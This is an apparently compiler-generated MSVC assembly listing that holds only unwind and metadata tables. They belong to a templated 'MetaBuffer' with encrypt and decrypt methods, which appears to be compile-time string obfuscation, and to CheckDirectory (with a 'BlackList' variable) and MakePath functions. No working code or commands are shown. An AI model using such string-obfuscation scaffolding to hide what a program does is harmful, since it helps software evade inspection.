;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0425H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02d5H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08bdH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0479H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0479H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	022dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	022dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	0185H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CheckDirectory@@YAHPEB_W@Z DD 025052c01H
	DD	010e2313H
	DD	070070099H
	DD	05006H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?CheckDirectory@@YAHPEB_W@Z$rtcName$0 DB 042H		; CheckDirectory
	DB	06cH
	DB	061H
	DB	063H
	DB	06bH
	DB	04cH
	DB	069H
	DB	073H
	DB	074H
	DB	00H
	ORG $+6
?CheckDirectory@@YAHPEB_W@Z$rtcVarDesc DD 030H		; CheckDirectory
	DD	058H
	DQ	FLAT:?CheckDirectory@@YAHPEB_W@Z$rtcName$0
	ORG $+48
?CheckDirectory@@YAHPEB_W@Z$rtcFrameData DD 01H		; CheckDirectory
	DD	00H
	DQ	FLAT:?CheckDirectory@@YAHPEB_W@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	02bH
	DB	055H
	DB	07fH
	DB	0a9H
	DB	0d3H
	DB	0ddH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z DD 045051d01H
	DD	0118431dH
	DD	070110037H
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z DD 025053601H
	DD	0118231dH
	DD	070110053H
	DD	05010H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z$rtcName$0 DB 050H ; MakePath
	DB	061H
	DB	074H
	DB	068H
	DB	00H
	ORG $+3
?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z$rtcName$1 DB 05fH ; MakePath
	DB	05fH
	DB	024H
	DB	041H
	DB	072H
	DB	072H
	DB	061H
	DB	079H
	DB	050H
	DB	061H
	DB	064H
	DB	00H
	ORG $+12
?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z$rtcVarDesc DD 088H ; MakePath
	DD	08H
	DQ	FLAT:?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z$rtcName$1
	DD	048H
	DD	020H
